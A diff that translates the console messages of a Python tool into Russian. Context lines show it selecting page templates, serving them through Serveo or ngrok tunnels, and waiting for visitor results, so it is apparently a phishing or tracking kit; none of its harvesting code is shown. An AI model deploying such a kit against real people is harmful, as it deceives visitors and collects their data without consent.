@@ -76,7 +76,7 @@ def ver_check():
 			if version == github_ver:
 				print(C + '[' + G + ' Обновлено ' + C +']' + '\n')
 			else:
-				print(C + '[' + G + ' Available : {} '.format(github_ver) + C + ']' + '\n')
+				print(C + '[' + G + ' Доступно : {} '.format(github_ver) + C + ']' + '\n')
 		else:
 			print(C + '[' + R + ' Статус : {} '.format(ver_sc) + C + ']' + '\n')
 	except Exception as e:
@@ -86,7 +86,7 @@ def tunnel_select():
 	if tunnel_mode == 'manual':
 		serveo()
 	elif tunnel_mode == None:
-		print(G + '[+]' + C + 'Необходимо запустить ngrok для отправки страницы в интернет' + W + '\n')
+		print(G + '[+]' + C + ' Необходимо запустить ngrok для отправки страницы в интернет' + W + '\n')
 	else:
 		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
 		exit()
@@ -112,7 +112,7 @@ def template_select():
 		print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
 		sys.exit()
 	
-	print('\n' + G + '[+]' + C + ' Загрузка {} шаблона...'.format(templ_json['templates'][selected]['name']) + W)
+	print('\n' + G + '[+]' + C + ' Загрузка шаблона "{}"...'.format(templ_json['templates'][selected]['name']) + W)
 	
 	module = templ_json['templates'][selected]['module']
 	if module == True:
@@ -129,7 +129,7 @@ def serveo():
 	global subdom
 	flag = False
 
-	print(G + '[+]' + C + ' Проверка Serveo статуса...', end='')
+	print(G + '[+]' + C + ' Проверка статуса Serveo ...', end='')
 
 	try:
 		time.sleep(1)
@@ -182,11 +182,11 @@ def server():
 		php_rqst = requests.get('http://0.0.0.0:{}/index.html'.format(port))
 		php_sc = php_rqst.status_code
 		if php_sc == 200:
-			print(C + '[' + G + ' Успех ' + C + ']' + W)
+			print(C + '[' + G + ' Успешно ' + C + ']' + W)
 		else:
 			print(C + '[' + R + 'Статус : {}'.format(php_sc) + C + ']' + W)
 	except requests.ConnectionError:
-		print(C + '[' + R + ' Неудача ' + C + ']' + W)
+		print(C + '[' + R + ' Неудачно ' + C + ']' + W)
 		Quit()
 
 def wait():
@@ -195,7 +195,7 @@ def wait():
 		time.sleep(2)
 		size = os.path.getsize(result)
 		if size == 0 and printed == False:
-			print('\n' + G + '[+]' + C + ' Ожидание взаимодействия с пользователем...' + W + '\n')
+			print('\n' + G + '[+]' + C + ' Ожидание пользователя...' + W + '\n')
 			printed = True
 		if size > 0:
 			main()
@@ -372,5 +372,5 @@ try:
 	main()
 
 except KeyboardInterrupt:
-	print ('\n' + R + '[!]' + C + ' Keyboard Interrupt.' + W)
+	print ('\n' + R + '[!]' + C + ' Прервано клавиатурой.' + W)
 	Quit()
